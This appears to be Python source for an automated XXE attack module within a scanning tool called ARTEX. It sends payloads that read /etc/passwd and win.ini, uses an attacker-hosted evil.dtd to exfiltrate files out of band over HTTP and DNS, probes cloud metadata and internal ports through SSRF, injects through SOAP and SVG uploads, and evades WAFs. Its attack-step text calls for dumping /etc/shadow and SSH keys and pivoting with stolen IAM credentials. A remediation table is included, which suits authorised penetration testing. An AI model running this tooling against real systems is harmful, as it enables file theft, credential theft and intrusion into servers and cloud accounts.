
class _ResponseAnalyser:
    """
    Heuristics to detect XXE in HTTP responses.
    Four signal types:
      1. File content patterns in body (passwd, win.ini, hostname)
      2. XML parse error leaking file path (error-based)
      3. Unexpected response length vs a baseline probe (may contain data)
      4. SSRF indicators (HTTP connection logs, error body patterns)
    """

    _LINUX_INDICATORS: List[re.Pattern] = [
        re.compile(r'root:.*?:/bin/(bash|sh)', re.S),       # /etc/passwd
        re.compile(r'\[extensions\].*?MAPI=1', re.S | re.I), # win.ini
        re.compile(r'^\s*[a-zA-Z0-9_-]+\s*$', re.M),        # /etc/hostname (1 word)
        re.compile(r'127\.0\.0\.1.*?localhost', re.S),       # /etc/hosts
        re.compile(r'DB_PASSWORD|DB_HOST|WORDPRESS_DB', re.I), # config files
        re.compile(r'-----BEGIN .{1,20}PRIVATE KEY-----'),   # SSH private key
        re.compile(r'DB_PASS|db\.password|database\.password', re.I),
        re.compile(r'<\?php', re.I),                         # PHP source
        re.compile(r'mysql_password|mysqlpassword', re.I),
    ]

    _ERROR_INDICATORS: List[re.Pattern] = [
        re.compile(r'javax\.xml\.stream\.XMLStreamException', re.I),
        re.compile(r'org\.xml\.sax\.SAXParseException', re.I),
        re.compile(r'com\.sun\.org\.apache\.xerces', re.I),
        re.compile(r'java\.io\.FileNotFoundException', re.I),
        re.compile(r'libxml2.*?failed to load external entity', re.I),
        re.compile(r'artex-err://', re.I),    # error-based probe marker
        re.compile(r'failed to open stream', re.I),
        re.compile(r'SimpleXML.*?failed', re.I),
        re.compile(r'DOMDocument::load', re.I),
    ]

    _SSRF_INDICATORS: List[re.Pattern] = [
        re.compile(r'Connection refused', re.I),
        re.compile(r'connection timed out', re.I),
        re.compile(r'No route to host', re.I),
        re.compile(r'ami-id|instance-id|placement', re.I),   # AWS metadata
        re.compile(r'"hostname"\s*:', re.I),                  # GCP metadata JSON
        re.compile(r'computeMetadata', re.I),
    ]

    def analyse(
        self,
        resp:          Response,
        payload:       str,
        baseline_len:  Optional[int] = None,
    ) -> Tuple[bool, bool, bool, Dict[str, Any]]:
        """
        Returns (is_xxe_hit, is_error_leak, is_ssrf_hit, evidence_dict)
        """
        body = resp.text or ""
        evidence: Dict[str, Any] = {
            "status_code": resp.status_code,
            "body_len":    len(body),
            "content_type": resp.headers.get("Content-Type", ""),
        }

        # file content indicators
        for pat in self._LINUX_INDICATORS:
            m = pat.search(body)
            if m:
                evidence["file_content_match"] = m.group(0)[:200]
                evidence["pattern"]            = pat.pattern
                return True, False, False, evidence

        # error-based leak
        for pat in self._ERROR_INDICATORS:
            m = pat.search(body)
            if m:
                evidence["error_match"] = m.group(0)[:200]
                return False, True, False, evidence

        # SSRF indicators
        for pat in self._SSRF_INDICATORS:
            m = pat.search(body)
            if m:
                evidence["ssrf_match"] = m.group(0)[:200]
                return False, False, True, evidence

        # anomalous response length vs baseline
        if baseline_len is not None:
            delta = len(body) - baseline_len
            if delta > 200:
                evidence["length_delta"] = delta
                evidence["note"] = "Response significantly longer than baseline — possible data exfil"
                return False, False, False, evidence

        return False, False, False, evidence


# ─────────────────────────────────────────────────────────────────────────────
# Probe executor
# ─────────────────────────────────────────────────────────────────────────────

class _ProbeExecutor:
    """
    For each XxeEndpoint:
      1. Establish baseline (HEAD or benign XML POST)
      2. Run in-band probes (file read, error-based, XInclude)
      3. Run OOB probes (HTTP, DTD chain, Gopher)
      4. Run SSRF probes (metadata, internal port scan)
      5. Run bypass probes when WAF present
      6. Run context-specific probes (SOAP, SVG upload, XSLT)
    """

    def __init__(
        self,
        http:     _HttpPool,
        builder:  _PayloadBuilder,
        analyser: _ResponseAnalyser,
        oob:      _OobListener,
        oob_host: str,
        oob_port: int,
    ):
        self._http     = http
        self._builder  = builder
        self._analyser = analyser
        self._oob      = oob
        self._oob_host = oob_host
        self._oob_port = oob_port

    def probe(self, ep: XxeEndpoint) -> List[XxeFinding]:
        findings: List[XxeFinding] = []

        baseline_len = self._baseline(ep)

        # ── in-band file read ─────────────────────────────────────────────────
        for filepath, payload in self._builder.inband_file_read_all()[:8]:
            resp = self._send(ep, payload)
            if not resp:
                continue
            is_xxe, is_err, is_ssrf, ev = self._analyser.analyse(
                resp, payload, baseline_len
            )
            if is_xxe:
                findings.append(self._make_finding(
                    variant     = XxeVariant.INBAND_FILE_READ,
                    severity    = FindingSeverity.CRITICAL,
                    status      = FindingStatus.CONFIRMED,
                    ep          = ep,
                    payload     = payload,
                    evidence    = {**ev, "file": filepath},
                    oob_hit     = False,
                    oob_data    = ev.get("file_content_match"),
                    steps=[
                        f"POST XML with SYSTEM entity pointing to {filepath}",
                        "Response contains file contents — parser resolves external entity",
                        "Dump /etc/shadow, app config, SSH keys next",
                    ],
                    notes=f"In-band XXE confirmed — file {filepath!r} read successfully",
                ))
                break  # confirmed CRITICAL — no need to try more files

            if is_err:
                findings.append(self._make_finding(
                    variant   = XxeVariant.INBAND_ERROR_BASED,
                    severity  = FindingSeverity.HIGH,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {**ev, "file": filepath},
                    oob_hit   = False,
                    oob_data  = ev.get("error_match"),
                    steps=[
                        "XML parser emits error that includes file path / content fragment",
                        "Error-based exfil: craft entity that triggers error with file content",
                        "Chain with error-based DTD for full file read",
                    ],
                    notes="XML parse error leaks file path or content — error-based XXE",
                ))
                break

        # ── XInclude ──────────────────────────────────────────────────────────
        for filepath in ["/etc/passwd", "C:/Windows/win.ini"]:
            payload = self._builder.xinclude_file(filepath)
            resp    = self._send(ep, payload)
            if not resp:
                continue
            is_xxe, _, _, ev = self._analyser.analyse(resp, payload, baseline_len)
            if is_xxe:
                findings.append(self._make_finding(
                    variant   = XxeVariant.INBAND_XINCLUDE,
                    severity  = FindingSeverity.CRITICAL,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {**ev, "file": filepath},
                    oob_hit   = False,
                    oob_data  = ev.get("file_content_match"),
                    steps=[
                        "XInclude parse=text reads arbitrary local files",
                        "No DOCTYPE required — bypasses DOCTYPE-only filters",
                        "Extend to SSRF via href=http://...",
                    ],
                    notes=f"XInclude file read confirmed: {filepath}",
                ))
                break

        # ── OOB HTTP basic ────────────────────────────────────────────────────
        probe_id  = uuid.uuid4().hex[:8]
        oob_path  = f"oob-probe/{probe_id}"
        payload   = self._builder.oob_http_basic(oob_path)
        hits_before = len(self._oob.hits())
        resp = self._send(ep, payload)
        time.sleep(1.5)   # allow OOB callback to arrive
        new_hits = self._oob.hits()[hits_before:]

        if new_hits:
            findings.append(self._make_finding(
                variant   = XxeVariant.OOB_HTTP_BASIC,
                severity  = FindingSeverity.HIGH,
                status    = FindingStatus.CONFIRMED,
                ep        = ep,
                payload   = payload,
                evidence  = {"oob_hits": new_hits, "probe_id": probe_id},
                oob_hit   = True,
                oob_data  = None,
                steps=[
                    f"OOB HTTP callback received from target at /{oob_path}",
                    "Blind XXE confirmed — parser resolves external entities",
                    "Escalate: serve evil.dtd to chain file read + exfil",
                ],
                notes="Blind XXE confirmed via OOB HTTP callback — parser resolves SYSTEM entities",
            ))

        # ── OOB DTD chain ─────────────────────────────────────────────────────
        payload     = self._builder.oob_dtd_chain_trigger("evil.dtd")
        hits_before = len(self._oob.hits())
        resp = self._send(ep, payload)
        time.sleep(2.0)
        new_hits = self._oob.hits()[hits_before:]

        for hit in new_hits:
            decoded = hit.get("decoded_exfil")
            if decoded and len(decoded) > 20:
                findings.append(self._make_finding(
                    variant   = XxeVariant.OOB_HTTP_DTD_CHAIN,
                    severity  = FindingSeverity.CRITICAL,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {
                        "oob_hit":    hit,
                        "exfil_data": decoded[:500],
                    },
                    oob_hit   = True,
                    oob_data  = decoded[:500],
                    steps=[
                        "Target loaded attacker DTD from OOB server",
                        "DTD read /etc/passwd and exfiltrated via OOB HTTP GET",
                        f"Received base64-encoded content: {decoded[:60]}...",
                    ],
                    dtd_server = self._builder._oob_url("evil.dtd"),
                    notes="OOB DTD chain exfil confirmed — file contents received at attacker server",
                ))
                break

        # ── SSRF via XXE — metadata endpoints ────────────────────────────────
        for meta_url in self._builder._META_URLS[:3]:
            payload = self._builder.ssrf_metadata(meta_url)
            resp    = self._send(ep, payload)
            if not resp:
                continue
            _, _, is_ssrf, ev = self._analyser.analyse(resp, payload, baseline_len)
            if is_ssrf:
                findings.append(self._make_finding(
                    variant   = XxeVariant.SSRF_METADATA,
                    severity  = FindingSeverity.CRITICAL,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {**ev, "meta_url": meta_url},
                    oob_hit   = False,
                    oob_data  = ev.get("ssrf_match"),
                    steps=[
                        f"XXE SYSTEM entity pointed at {meta_url}",
                        "Response contains cloud metadata keys",
                        "Extract IAM credentials → pivot to AWS API",
                    ],
                    notes=f"SSRF via XXE reached cloud metadata endpoint: {meta_url}",
                ))
                break

        # ── SSRF internal port scan ───────────────────────────────────────────
        host = urlparse(ep.url).hostname or ""
        for port in self._builder._INTERNAL_PORTS[:6]:
            payload  = self._builder.ssrf_internal_port("127.0.0.1", port)
            t0       = time.perf_counter()
            resp     = self._send(ep, payload)
            elapsed  = time.perf_counter() - t0
            if not resp:
                continue
            _, _, is_ssrf, ev = self._analyser.analyse(resp, payload, baseline_len)
            # Time-based SSRF detection: open port → fast connect reset
            # closed port → immediate reset or timeout; difference > 200ms
            if is_ssrf or (elapsed < 0.5 and resp.status_code != 404):
                findings.append(self._make_finding(
                    variant   = XxeVariant.SSRF_INTERNAL_SCAN,
                    severity  = FindingSeverity.HIGH,
                    status    = FindingStatus.LIKELY if not is_ssrf else FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {
                        **ev,
                        "target":   f"127.0.0.1:{port}",
                        "elapsed_s": round(elapsed, 3),
                    },
                    oob_hit   = False,
                    oob_data  = None,
                    steps=[
                        f"XXE SYSTEM entity targeted http://127.0.0.1:{port}/",
                        "Response timing or error indicates internal port is reachable",
                        "Enumerate internal services; pivot to Redis/Elasticsearch",
                    ],
                    notes=f"SSRF internal scan via XXE — port {port} reachable on 127.0.0.1",
                ))

        # ── SOAP injection (if SOAP endpoint) ─────────────────────────────────
        if ep.endpoint_type in (EndpointType.SOAP, EndpointType.XMLRPC):
            for filepath in ["/etc/passwd", "C:/Windows/win.ini"]:
                payload = self._builder.soap_injection(filepath)
                resp    = self._send(ep, payload,
                                     ct="text/xml; charset=utf-8")
                if not resp:
                    continue
                is_xxe, _, _, ev = self._analyser.analyse(resp, payload, baseline_len)
                if is_xxe:
                    findings.append(self._make_finding(
                        variant   = XxeVariant.SOAP_INJECTION,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        ep        = ep,
                        payload   = payload,
                        evidence  = {**ev, "file": filepath},
                        oob_hit   = False,
                        oob_data  = ev.get("file_content_match"),
                        steps=[
                            "XXE injected inside SOAP Body element",
                            "SOAP processor resolved external entity",
                            "File contents returned in SOAP response",
                        ],
                        notes=f"SOAP XXE confirmed — file {filepath!r} exfiltrated via SOAP response",
                    ))
                    break

            # SOAP OOB probe
            payload     = self._builder.soap_oob()
            hits_before = len(self._oob.hits())
            self._send(ep, payload, ct="text/xml; charset=utf-8")
            time.sleep(1.5)
            if self._oob.hits()[hits_before:]:
                findings.append(self._make_finding(
                    variant   = XxeVariant.SOAP_INJECTION,
                    severity  = FindingSeverity.HIGH,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = payload,
                    evidence  = {"oob_hits": self._oob.hits()[hits_before:]},
                    oob_hit   = True,
                    oob_data  = None,
                    steps=[
                        "SOAP OOB probe triggered HTTP callback",
                        "Blind SOAP XXE confirmed",
                    ],
                    notes="Blind SOAP XXE confirmed via OOB callback",
                ))

        # ── SVG upload ────────────────────────────────────────────────────────
        if ep.endpoint_type == EndpointType.SVG_UPLOAD:
            svg_payload = self._builder.svg_xxe("/etc/passwd")
            resp = self._send_multipart(ep, svg_payload, "image.svg", "image/svg+xml")
            if resp:
                is_xxe, _, _, ev = self._analyser.analyse(resp, svg_payload, baseline_len)
                if is_xxe:
                    findings.append(self._make_finding(
                        variant   = XxeVariant.SVG_UPLOAD,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        ep        = ep,
                        payload   = svg_payload,
                        evidence  = {**ev, "file": "/etc/passwd"},
                        oob_hit   = False,
                        oob_data  = ev.get("file_content_match"),
                        steps=[
                            "SVG file uploaded with embedded SYSTEM entity",
                            "Server-side SVG processor (ImageMagick, Inkscape, librsvg) resolved entity",
                            "File contents returned in rendered image response or error",
                        ],
                        notes="SVG XXE confirmed — file read via server-side SVG rendering",
                    ))
            # SVG OOB
            svg_oob = self._builder.svg_oob()
            hits_before = len(self._oob.hits())
            self._send_multipart(ep, svg_oob, "probe.svg", "image/svg+xml")
            time.sleep(1.5)
            if self._oob.hits()[hits_before:]:
                findings.append(self._make_finding(
                    variant   = XxeVariant.SVG_UPLOAD,
                    severity  = FindingSeverity.HIGH,
                    status    = FindingStatus.CONFIRMED,
                    ep        = ep,
                    payload   = svg_oob,
                    evidence  = {"oob_hits": self._oob.hits()[hits_before:]},
                    oob_hit   = True,
                    oob_data  = None,
                    steps=[
                        "SVG OOB probe triggered HTTP callback",
                        "Blind SVG XXE confirmed — SVG processor resolves external entities",
                    ],
                    notes="Blind SVG XXE via upload confirmed — OOB callback received",
                ))

        # ── WAF bypass probes ─────────────────────────────────────────────────
        if ep.waf_bypass:
            # UTF-16 bypass
            utf16_bytes = self._builder.bypass_utf16("/etc/passwd")
            resp = self._send_raw(ep, utf16_bytes,
                                  "text/xml; charset=UTF-16")
            if resp:
                is_xxe, _, _, ev = self._analyser.analyse(resp, "[utf16]", baseline_len)
                if is_xxe:
                    findings.append(self._make_finding(
                        variant   = XxeVariant.BYPASS_UTF16,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        ep        = ep,
                        payload   = "[UTF-16 encoded payload]",
                        evidence  = {**ev, "encoding": "UTF-16"},
                        oob_hit   = False,
                        oob_data  = ev.get("file_content_match"),
                        steps=[
                            "UTF-16 encoding bypassed WAF UTF-8 signature scan",
                            "Parser decoded UTF-16 and resolved external entity",
                        ],
                        notes="XXE via UTF-16 encoding — WAF charset bypass",
                    ))

            # Nested param entity bypass
            payload  = self._builder.bypass_nested_param("/etc/passwd")
            resp     = self._send(ep, payload)
            if resp:
                is_xxe, _, _, ev = self._analyser.analyse(resp, payload, baseline_len)
                if is_xxe:
                    findings.append(self._make_finding(
                        variant   = XxeVariant.BYPASS_PARAM_ENTITIES,
                        severity  = FindingSeverity.CRITICAL,
                        status    = FindingStatus.CONFIRMED,
                        ep        = ep,
                        payload   = payload,
                        evidence  = ev,
                        oob_hit   = False,
                        oob_data  = ev.get("file_content_match"),
                        steps=[
                            "Nested parameter entity indirection bypassed WAF entity detection",
                            "Parser resolved double-nested entity chain to external file",
                        ],
                        notes="XXE via nested param entity bypass — WAF evasion confirmed",
                    ))

        # ── DNS OOB (last resort when HTTP OOB blocked) ───────────────────────
        payload     = self._builder.oob_dns_cname(f"probe-{uuid.uuid4().hex[:6]}")
        hits_before = len(self._oob.hits())
        self._send(ep, payload)
        time.sleep(2.0)
        # DNS hits on our local listener will come as HTTP if resolved to our IP
        if self._oob.hits()[hits_before:]:
            findings.append(self._make_finding(
                variant   = XxeVariant.OOB_DNS_CNAME,
                severity  = FindingSeverity.HIGH,
                status    = FindingStatus.CONFIRMED,
                ep        = ep,
                payload   = payload,
                evidence  = {"oob_hits": self._oob.hits()[hits_before:]},
                oob_hit   = True,
                oob_data  = None,
                steps=[
                    "DNS lookup for attacker-controlled subdomain triggered by XXE",
                    "Confirms XXE with DNS-only exfil channel (HTTP blocked outbound)",
                    "Chunk file content into subdomain labels for DNS exfil",
                ],
                notes="DNS OOB XXE confirmed — DNS resolution triggered by SYSTEM entity",
            ))

        return findings

    # ── send helpers ──────────────────────────────────────────────────────────

    def _send(
        self,
        ep:  XxeEndpoint,
        payload: str,
        ct:  Optional[str] = None,
    ) -> Optional[Response]:
        content_type = ct or ep.content_type
        if ep.method.upper() == "PUT":
            return self._http.put(ep.url, payload, content_type)
        return self._http.post(ep.url, payload, content_type)

    def _send_raw(
        self,
        ep:      XxeEndpoint,
        body:    bytes,
        ct:      str,
    ) -> Optional[Response]:
        """Send raw bytes (UTF-16 payloads)."""
        try:
            return requests.post(
                ep.url, data=body,
                headers={"Content-Type": ct},
                timeout=10, verify=False, allow_redirects=True,
            )
        except RequestException:
            return None

    def _send_multipart(
        self,
        ep:        XxeEndpoint,
        content:   str,
        filename:  str,
        mime:      str,
    ) -> Optional[Response]:
        """Multipart file upload carrying an SVG/XML payload."""
        try:
            files = {
                ep.param_name or "file": (
                    filename,
                    content.encode("utf-8"),
                    mime,
                )
            }
            return requests.post(
                ep.url, files=files,
                headers={"User-Agent": self._http._UA},
                timeout=10, verify=False, allow_redirects=True,
            )
        except RequestException:
            return None

    def _baseline(self, ep: XxeEndpoint) -> Optional[int]:
        """POST a benign XML to establish a baseline response length."""
        benign = '<?xml version="1.0"?><root><ping>1</ping></root>'
        resp   = self._send(ep, benign)
        return len(resp.text) if resp else None

    # ── finding factory ───────────────────────────────────────────────────────

    @staticmethod
    def _make_finding(
        variant:    XxeVariant,
        severity:   FindingSeverity,
        status:     FindingStatus,
        ep:         XxeEndpoint,
        payload:    str,
        evidence:   Dict[str, Any],
        oob_hit:    bool,
        oob_data:   Optional[str],
        steps:      List[str],
        notes:      str,
        dtd_server: Optional[str] = None,
    ) -> XxeFinding:
        return XxeFinding(
            finding_id    = str(uuid.uuid4()),
            variant       = variant,
            severity      = severity,
            status        = status,
            target_url    = ep.url,
            endpoint_type = ep.endpoint_type,
            payload_sent  = payload[:800],
            evidence      = evidence,
            oob_hit       = oob_hit,
            oob_data      = oob_data,
            attack_steps  = steps,
            dtd_server    = dtd_server,
            notes         = notes,
        )


# ─────────────────────────────────────────────────────────────────────────────
# Scorer and recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[XxeFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(f.severity.value * self._W.get(f.status, 0.5) for f in findings)
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


class _RecBuilder:
    _RECS: Dict[XxeVariant, str] = {
        XxeVariant.INBAND_FILE_READ:
            "Disable external entity processing: setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); "
            "setFeature('http://apache.org/xml/features/disallow-doctype-decl', true).",
        XxeVariant.INBAND_ERROR_BASED:
            "Suppress XML parser error details in responses; disable DOCTYPE declarations.",
        XxeVariant.INBAND_XINCLUDE:
            "Disable XInclude support: setFeature('http://apache.org/xml/features/xinclude', false).",
        XxeVariant.OOB_HTTP_BASIC:
            "Block outbound HTTP from XML-processing server; disable external entity resolution.",
        XxeVariant.OOB_HTTP_DTD_CHAIN:
            "Disable external DTD loading; block outbound HTTP at network layer from app server.",
        XxeVariant.OOB_DNS_CNAME:
            "Block outbound DNS from app server tier; disable external entity resolution.",
        XxeVariant.OOB_GOPHER_SSRF:
            "Block Gopher protocol; disable external entity resolution; firewall internal services.",
        XxeVariant.SSRF_HTTP:
            "Disable external entity resolution; validate/allowlist outbound HTTP targets.",
        XxeVariant.SSRF_METADATA:
            "Block 169.254.169.254 at network layer; use IMDSv2 (require PUT token) on EC2.",
        XxeVariant.SSRF_INTERNAL_SCAN:
            "Network-segment app server; block 127.0.0.0/8 and RFC1918 from app-tier outbound.",
        XxeVariant.SOAP_INJECTION:
            "Configure SOAP parser to disable DOCTYPE and external entities before processing.",
        XxeVariant.SVG_UPLOAD:
            "Sanitise/re-encode SVG server-side; disable entity resolution in SVG processor; "
            "use rsvg-convert with --no-external-files.",
        XxeVariant.XSLT_INJECTION:
            "Disable document() and extension functions in XSLT processor; run in sandbox.",
        XxeVariant.BYPASS_UTF16:
            "WAF must handle multi-charset XML; parser-level fix (disable DOCTYPE) is the only real mitigation.",
        XxeVariant.BYPASS_CDATA:
            "CDATA bypass works because mitigation was incomplete — disable DOCTYPE declarations entirely.",
        XxeVariant.BYPASS_LOCAL_DTD:
            "Local DTD repurpose exploits partially-patched configs — full disable of DOCTYPE is required.",
        XxeVariant.BYPASS_PARAM_ENTITIES:
            "Disable parameter entities: setFeature('http://xml.org/sax/features/external-parameter-entities', false).",
    }

    def build(self, findings: List[XxeFinding]) -> List[str]:
        seen:  Set[XxeVariant] = set()
        recs:  List[str] = []
        for f in sorted(findings, key=lambda x: (-x.severity.value,
                                                   x.status != FindingStatus.CONFIRMED)):
            if f.variant not in seen:
                seen.add(f.variant)
                recs.append(f"[{f.severity.name}][{f.variant.value}] "
                            f"{self._RECS.get(f.variant, 'Disable external entity resolution.')}")
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class XxeInjector:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after payload_analysis + tech_detection:

        from core.xxe_injector import XxeInjector

        xi = XxeInjector()
        scan_results[scan_id]['xxe_injection'] = xi.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )

    Optional — set oob_host to a real internet-reachable host
    (interactsh subdomain, Burp Collaborator URL) for OOB exfil
    to work from behind NAT:

        xi = XxeInjector(oob_host="xyz.oast.fun", oob_port=80)
    """

    def __init__(
        self,
        oob_host:    str   = "",       # empty = use local listener IP
        oob_port:    int   = 0,        # 0 = OS picks free port for local
        timeout:     float = 10.0,
        on_finding:  Optional[Callable[[XxeFinding], None]] = None,
    ):
        self._oob_host_cfg = oob_host
        self._oob_port_cfg = oob_port
        self._timeout      = timeout
        self._on_finding   = on_finding

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("XxeInjector %s starting for %s", run_id, domain)

        # 1. OOB listener
        oob = _OobListener(port=self._oob_port_cfg)
        oob.start()

        # Resolve effective OOB host
        oob_host = self._oob_host_cfg
        if not oob_host:
            try:
                oob_host = socket.gethostbyname(socket.gethostname())
            except OSError:
                oob_host = "127.0.0.1"
        oob_port = oob.bound_port if oob.bound_port else self._oob_port_cfg

        # 2. components
        http     = _HttpPool(timeout=self._timeout)
        builder  = _PayloadBuilder(oob_host, oob_port)
        analyser = _ResponseAnalyser()

        # 3. WAF bypass strategy
        pa          = scan_results.get("payload_analysis", {})
        waf_info    = pa.get("waf_detected", {})
        waf_bypass  = waf_info.get("bypass_strategy") if waf_info.get("detected") else None

        # 4. endpoint discovery
        discoverer = _EndpointDiscoverer()
        endpoints  = discoverer.discover(domain, scan_results, waf_bypass)
        logger.info("XXE endpoints: %d", len(endpoints))

        # 5. probe each endpoint (threaded — one thread per endpoint)
        executor     = _ProbeExecutor(http, builder, analyser, oob,
                                      oob_host, oob_port)
        all_findings: List[XxeFinding] = []
        lock         = threading.Lock()

        def probe_one(ep: XxeEndpoint) -> None:
            try:
                results = executor.probe(ep)
            except Exception as exc:
                logger.debug("Probe %s failed: %s", ep.url, exc)
                results = []
            with lock:
                all_findings.extend(results)
                if self._on_finding:
                    for f in results:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        threads = [threading.Thread(target=probe_one, args=(ep,))
                   for ep in endpoints]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        oob.stop()

        # 6. collect metadata
        oob_hits      = sum(1 for f in all_findings if f.oob_hit)
        files_read    = list({
            f.evidence.get("file", "")
            for f in all_findings
            if f.oob_data or f.evidence.get("file_content_match")
        } - {""})
        ssrf_confirmed = any(
            f.variant in (
                XxeVariant.SSRF_METADATA, XxeVariant.SSRF_INTERNAL_SCAN,
                XxeVariant.OOB_GOPHER_SSRF, XxeVariant.SSRF_HTTP,
            )
            for f in all_findings
            if f.status in (FindingStatus.CONFIRMED, FindingStatus.LIKELY)
        )

        # sort CRITICAL first, CONFIRMED first within severity
        all_findings.sort(
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED)
        )

        scorer = _Scorer()
        score, risk_level = scorer.score(all_findings)
        recs   = _RecBuilder().build(all_findings)
        dtd_payloads = builder.all_dtd_payloads()

        finished_at = datetime.now()
        result = XxeResult(
            run_id            = run_id,
            domain            = domain,
            endpoints_tested  = len(endpoints),
            findings          = [f.to_dict() for f in all_findings],
            oob_hits          = oob_hits,
            files_read        = files_read,
            ssrf_confirmed    = ssrf_confirmed,
            score             = score,
            risk_level        = risk_level,
            dtd_payloads      = dtd_payloads,
            techniques_tested = sorted({f.variant.value for f in all_findings}),
            recommendations   = recs,
            started_at        = started_at,
            finished_at       = finished_at,
        )

        logger.info(
            "XxeInjector %s done — score=%.1f risk=%s findings=%d oob_hits=%d",
            run_id, score, risk_level, len(all_findings), oob_hits,
        )
        return result.to_dict()